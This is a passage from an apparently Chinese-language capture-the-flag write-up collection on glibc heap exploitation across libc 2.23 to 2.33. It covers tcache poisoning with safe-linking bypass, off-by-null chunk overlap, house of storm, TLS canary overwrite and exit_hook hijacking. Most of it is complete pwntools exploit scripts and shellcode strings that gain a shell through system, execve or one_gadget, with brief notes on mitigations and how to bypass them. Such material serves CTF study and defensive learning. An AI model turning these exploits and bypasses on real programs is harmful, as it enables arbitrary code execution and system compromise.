	p.sendlineafter("content:",con)

def show(idx):
	sla("choice :",'2')
	sla("id:",idx)

def dele(idx):
	sla("choice :",'3')
	sla("id:",idx)

ptr = 0x202040

add(0x58,'a'*0x48+p64(0x61))#0
add(0x58,'a')#1
add(0x58,'2')
add(0x58,'\x00')
add(0x58,'a')
dele(0)
dele(1)
dele(0)
# show(1)

show(0)
heap_base = (u64(p.recvuntil("I")[:-1])>>8)&0xffffffffffff
lg('heap_base',heap_base)

# 构造向下合并
fake_chunk = heap_base-0x10
add(0x58,p64(fake_chunk))
# add(0x28,p64(heap_base+0x20))#2
add(0x58,'aaaa')#1
add(0x58,'a')#0
add(0x58,p64(0)+p64(0xc1)+p64(0x32))

dele(2)
dele(1)
show(1)
# 0x7ffff77f0000
libc_base = (u64(p.recvuntil("I")[:-1])>>8)&0xffffffffffff
libc_base = 0x7ffff77f0000
lg('libc_base',libc_base)
free_hook = libc_base+libc.sym['__free_hook']
system = libc_base+0x453a0
IO_list_all = libc_base + libc.sym['_IO_list_all']

add(0x58,'bbb')# unsortbin

dele(0)

sleep(5)

add(0x58,'a')#0
add(0x58,'a'*0x40+p64(0)+p64(0x61)+'/bin/sh')#1

dele(0)
dele(1)
dele(0)
dbg()
fake_chunk1 = heap_base+0x60
fake_chunk2 = heap_base+0x120

add(0x58,p64(fake_chunk2))#
add(0x58,'a')#1
add(0x58,'a')

lg('system',system)
pay = '\x00'*8+p64(heap_base+0x140)+p64(0)*3+p64(system)
add(0x58,pay)

dele(0)
dele(1)
dele(0)
add(0x58,p64(fake_chunk1))#
add(0x58,'a')#1
add(0x58,'a')
pay = p64(libc_base+0x304B78)+p64(IO_list_all-0x10)
pay += p64(0)+p64(1)+p64(0)*7
add(0x58,pay)

sleep(5)
sla("choice :",'1')
sla("size:",0x10)

p.interactive()
```

## libc2.27/堆溢出改fd改got表(offbynull)

无edit

add功能scanf%d输入size，gets输入内容，无存在性检测，8个堆

del功能，先puts，然后free置空

2.27下有tcache_count的检测，要满足数量。然后申请到got表改got表时，会强制补齐0x10字节，多余会补0，需要注意一下影响

因为有offbynull，这里也演示一下2.27下的堆向上合并

```python
add(0,0x410,'a')
add(1,0x88,'a')
add(2,0x4f0,'c')
add(3,0x80,'/bin/sh\x00')

dele(0)
dele(1)
add(1,0x88,'a'*0x80+p64(0x90+0x420))
dele(2)
```

![image-20220518222919305](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220518222919305.png)

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux')
context.log_level = 'debug'

p = process('./attachment-38')
# p = remote("123.57.69.203",5810)
elf = ELF("./attachment-38")
libc = elf.libc
def dbg():
    gdb.attach(p)

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def add(idx,size,con):
    sl("add")
    sla("Index: ",idx)
    sla("Size: ",size)
    p.sendlineafter("Data: ",con)

def dele(idx):
    sl("remove")
    sla("Index: ",idx)

# sh = 0x400896
puts_got = elf.got['puts']
free_got = elf.got['free']
free_plt = elf.plt['free']
system_plt = elf.plt['system']
puts_plt = elf.plt['puts']
printf_plt = elf.plt['printf']
strncmp_plt = elf.plt['strncmp']

add(5,0x8,'a')
add(6,0x8,'a')
add(7,0x8,'a')

dele(7)
dele(6)
dele(5)
add(5,0x8,'a'*0x18+p64(0x20)+p64(free_got))

add(6,0x8,'a')
add(6,0x8,p64(free_plt)+p64(system_plt)[:-1])


p.interactive()
```

## libc2.33/打掉tcache拿libc(UAF)

![image-20220522194235160](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220522194235160.png)

![image-20220522194255324](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220522194255324.png)

采用for循环malloc，同时未清空管理数组

**2.33主要是2个绕过**

1.tcache_get，在新版本下，当tcache头指针指向的内存被malloc申请出来，tcache头指针会指向REVEAL_PTR (e->next)，REVEAL_PTR用来恢复写入tcache头指针的值，定义如下：

```c
tcache_get (size_t tc_idx)
{
	tcache_entry *e = tcache->entries[tc_idx];
	if (__glibc_unlikely (!aligned_OK (e)))
	malloc_printerr (“malloc(): unaligned tcache chunk detected”);
	tcache->entries[tc_idx] = REVEAL_PTR (e->next);
	–(tcache->counts[tc_idx]);
	e->key = 0;
	return (void *) e;
}
```
首先是泄露key，作为异或基值，后续对fd的伪造都要进行异或

2.第二个就是在glibc-2.32版本中还引入了对tcache和fastbins中申请及释放内存地址的对齐检测

```c
#define aligned_OK(m)  (((unsigned long)(m) & MALLOC_ALIGN_MASK) == 0)
#define MALLOC_ALIGN_MASK (MALLOC_ALIGNMENT – 1)
#define MALLOC_ALIGNMENT (2 * SIZE_SZ < __alignof__ (long double) \
? __alignof__ (long double) : 2 * SIZE_SZ)
```

可以看到内存地址需要以0x10字节对齐。

其目的是为了ban掉以下利用

1.原有tcache poisoning、fastbin attack等通过直接覆盖chunk->next指针达到任意地址申请的利用办法

2.由于检测了申请地址是否以0x10对齐，fastbin attack的利用办法受到限制，例如经典的通过错位构造”\x7f”劫持malloc_hook和IO_FILE的利用办法。

**绕过方法**

1.当tcache为空时，next指针会指向next地址右移12位的值，如果能将此值泄漏出来，则可以直接使用此值与目标地址异或，覆盖next指针从而申请内存到任意地址

2.由于tcache链表头指针存储的是当前释放堆地址的值，即tcache->entries[tc_idx] = e，tcache_stashing_unlink_attack的办法依然有效。

3.同样因为tcache链表头指针存储的是当前释放堆地址的值，所以如果能劫持到tcache结构体内存将链表头指针修改为目标地址，即可实现申请内存到任意地址。

4.通过largebin的fd_nextsize或bk_nextsize来泄漏完整堆地址，可以将与目标地址异或的结果覆盖到next指针达到任意地址申请。

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux')
context.log_level = 'debug'

p = process("./pwn")
p=remote("node4.buuoj.cn","29986")
elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda name,data          :p.success(name + "-> 0x%x" % data)

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def add(size,con):
	sla(": ",1)
	sla("Please tell me its size:",size)
	p.sendafter("Content: ",con)

def edit(idx,con):
	sla(": ",2)
	sla("Please tell me the index:",idx)
	p.sendlineafter("Please tell me its content:",con)

def show(idx):
	sla(": ",4)
	sla("Please tell me the index:",idx)

def dele(idx):
	sla(": ",3)
	sla("Please tell me the index:",idx)

ptr = 0x40C0

for i in range(7):
    add(0x10,'a')

dele(0)
dele(1)
show(0)
key = u64(p.recvuntil("1")[-9:-1])
lg('key',key)
show(1)
heap=(u64(p.recvuntil("1")[-9:-1])^key)-0x2a0
lg('heap',heap)


edit(1,p64((heap+0x10)^key))
add(0x10,'\x00')#7
add(0x10,p64(0))#8
# add(0x10,'a')#7
# add(0x10,'a')
# add(0x10,'a')

dele(5)
dele(6)
# add(0x10,p64(0))#1
edit(6,p64((heap+0x50)^key))
add(0x10,'\n')#9
add(0x10,p64(0)+p64(0x0007000000000000))#10

dele(8)
add(0x40,'a')#11
show(11)
libc_base = u64(p.recvuntil("1")[-9:-1])-0x1e0e61
lg('libc_base',libc_base)
free_hook=libc_base+libc.sym['__free_hook']
sys=libc_base+libc.sym['system']
edit(11,p64(2))
dele(3)
edit(3,p64(free_hook^key))
add(0x10,'/bin/sh\x00')# 12
add(0x10,p64(sys))#8
dele(12)
# edit(6,p64(0x0007000000000000))
p.interactive()
```

## libc2.23/house of storm

主要是在一个unsorbinchunk和一个largebinchunk里进行伪造，达到目标地址(fakechunk)写入size，同时申请到目标地址的目的

这里的unsortbinchunk要比largebinchunk大

2.30后添加了双向链表检测，无法修改unsortbinchunk

```c
// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
struct {
    unsigned long  presize;
    unsigned long  size;
    unsigned long  fd;
    unsigned long  bk;
    unsigned long  fd_nextsize;
    unsigned long  bk_nextsize;
}chunk;

int main()
{
    unsigned long *large_chunk,*unsorted_chunk;
    unsigned long *fake_chunk = (unsigned long *)&chunk;
    char *ptr;


    unsorted_chunk=malloc(0x418);
    malloc(0X20);
    large_chunk=malloc(0x408);
    malloc(0x20);



    free(large_chunk);
    free(unsorted_chunk);
    unsorted_chunk=malloc(0x418);  //large_chunk归位
    free(unsorted_chunk);  // unsorted_chunk归位

	//重点一下3步
    unsorted_chunk[1] = (unsigned long )fake_chunk;// bk
    large_chunk[1]    = (unsigned long )fake_chunk+8;// bk
    large_chunk[3]    = (unsigned long )fake_chunk-0x18-5;// bknextsize

    
    ptr=malloc(0x48);
    strncpy(ptr, "/bin/sh\x00", 0x10);
    system(((char *)fake_chunk + 0x10));
    
    return 0;
}
```

## 堆题栈溢出改tls

![image-20220524220234152](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220524220234152.png)

漏洞点在于`gets(magic)`存在栈溢出，但有canary，一次然后进入堆流程，add功能有堆溢出且无size限制，show用write输出。

利用堆功能修改到tsl里存放的canary，gdb里用tls能看到相应的结构体，申请大堆到ld上方，覆盖修改。这里覆盖会将其他 dl_runtime_resolve 的指针覆盖掉，导致解析 system 的时候出错。所以用execve不调用dl。

```c
typedef struct {   
	void *tcb;    /* Pointer to the TCB.  Not necessarily the thread descriptor used by libpthread.  */   	dtv_t *dtv;   
	void *self;       /* Pointer to the thread descriptor.  */   
	int multiple_threads;   
	int gscope_flag;   
	uintptr_t sysinfo;   
	uintptr_t stack_guard;   //canary
	uintptr_t pointer_guard;   
	... 
} tcbhead_t;
```



![image-20220524220323080](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220524220323080.png)

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

p = process('./Huge_Space')
# p = remote("123.57.69.203","5330")
elf = ELF("./Huge_Space")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def add(idx,size,con):
    sl("+++")
    sla("Index:",idx)
    sla("Size: ",size)
    p.sendlineafter("Data: ",con)

def show(idx,size):
    sl("print")
    sla("Index: ",idx)
    sla("Size: ",size)

def exit():
    sl("exit")

pop_rdi = 0x0000000000400be3
pop_rsi_r15 = 0x0000000000400be1
pop_rbp = 0x0000000000400860
leaveret = 0x40090F
'''
0x0000000000400be3: pop rdi; ret; 
'''
sl('\x00'*0x48+p64(pop_rbp)+p64(0x6010c0+0x10)+p64(leaveret))
add(0,0x10,'a'*0x10+p64(0)+p64(0xd81))
add(1,0x1000,'a')
add(1,0x20,'')#1
show(1,0x20)

libc_base = uu64()-0x3ec200
execve = libc_base + libc.sym['execve']
pop_rdx = libc_base+0x0000000000001b96
lg('libc_base')
lg('execve')

add(3,0x22000,'\x00'*(0x024568))

pay = 'exit\x00\x00\x00\x00/bin/sh\x00'
pay += p64(pop_rdi)*2+p64(0x6010c8)
pay += p64(pop_rsi_r15)+p64(0)*2
pay += p64(pop_rdx)+p64(0)
pay += p64(execve)
sl(pay)
    
p.interactive()
```

## libc2.31/exit_hook利用(offbyone)

![image-20220528233508082](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220528233508082.png)

edit里有offbynull，没有show功能，ban了free_hook和malloc_hook

![image-20220528233639907](https://e4l4pic.oss-cn-beijing.aliyuncs.com/img/image-20220528233639907.png)

构造一个堆向下合并，修改二号堆的size，free后进入unsortbin，在三号堆块处伪造fd

```python
# _*_ coding:utf-8 _*_
from pwn import *
context(arch='amd64', os='linux', log_level='debug')

p = process('./pwn')
# p = remote("node4.buuoj.cn","25669")
elf = ELF("./pwn")
libc = elf.libc

def dbg():
    gdb.attach(p)
    pause()

#-----------------------------------------------------------------------------------------
s       = lambda data               :p.send(str(data))
sa      = lambda text,data          :p.sendafter(text, str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda text,data          :p.sendlineafter(text, str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda text               :p.recvuntil(text)
uu32    = lambda                    :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
uu64    = lambda                    :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
lg      = lambda s                  :p.success('%s -> 0x%x' % (s, eval(s)))

sh_x86_18="\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x86_20="\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sh_x64_21="\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------
def menu(choice):
    sla('Your choice:',str(choice))
    sleep(0.03)

def add(id,size):
    menu(1)
    sla('Idx:',str(id))
    sla('Size:',str(size))

def edit(id,data):
    menu(2)
    sla('Idx:',str(id))
    p.sendafter('context:',str(data))

def dele(id):
    menu(3)
    sla('Idx:',str(id))

add(0,0x38)
add(1,0x38)
add(2,0x38)
add(3,0x38)# overlap

add(4,0x418)
add(5,0x38)

edit(0,'a'*0x38+'\xc1')
dele(1)
add(1,0xb8)
dele(5)
dele(3)

edit(1,'a'*0x38+p64(0x41 + 0x40 + 0x420)+'\n')
dele(2)
add(2,0x18) # c1
add(3,0x18) # c2

add(7,2)
edit(7,'\xa0\x26'+'\n')
add(8,0x38) # c2
add(9,0x38) # c2
edit(9,p64(0xfbad1800)+p64(0)*3+'\x00\n')
libc_base = uu64() - 0x1eb980
lg('libc_base')

exit_hook = libc_base + 0x222f68
one = libc_base+0xe6c7e

dele(3)
dele(2)
edit(1,'a'*0x38+p64(0x21)+p64(exit_hook)+'\n')
add(2,0x18)
add(3,0x18)
edit(3,p64(one)+'\n')
menu(4)
# dbg()
p.interactive()
```

